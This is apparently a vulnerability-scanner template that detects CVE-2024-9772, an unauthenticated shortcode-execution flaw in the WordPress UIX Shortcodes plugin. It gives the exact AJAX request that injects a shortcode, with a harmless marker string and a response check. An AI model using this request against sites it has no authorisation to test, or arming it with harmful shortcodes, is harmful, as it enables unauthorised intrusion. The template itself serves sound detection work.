id: CVE-2024-9772

info:
  name: WordPress UIX Shortcodes <= 1.9.7 - Unauthenticated Shortcode Execution
  author: kankburhan
  severity: high
  description: |
    WordPress UIX Shortcodes plugin <= 1.9.7 is vulnerable to unauthenticated
    shortcode execution via the `uixscform_ajax_shortcodepreview` AJAX action.
    Attackers can inject arbitrary shortcodes without authentication, which may lead
    to stored XSS, content injection, or further compromise depending on active shortcodes.
  remediation: |
    Update UIX Shortcodes plugin to the latest patched version (>= 1.9.8).
  reference:
    - https://wpscan.com/vulnerability/CVE-2024-9772
    - https://nvd.nist.gov/vuln/detail/CVE-2024-9772
    - https://downloads.wordpress.org/plugin/uix-shortcodes.1.9.7.zip
  tags: wordpress,wp-plugin,uix,shortcodes,ajax,cve,cve2024

requests:
  - method: POST
    path:
      - "{{BaseURL}}/wp-admin/admin-ajax.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      action=uixscform_ajax_shortcodepreview&previewcode=[uix_sc_text text='{{randstr}}9772OK']

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "9772OK"
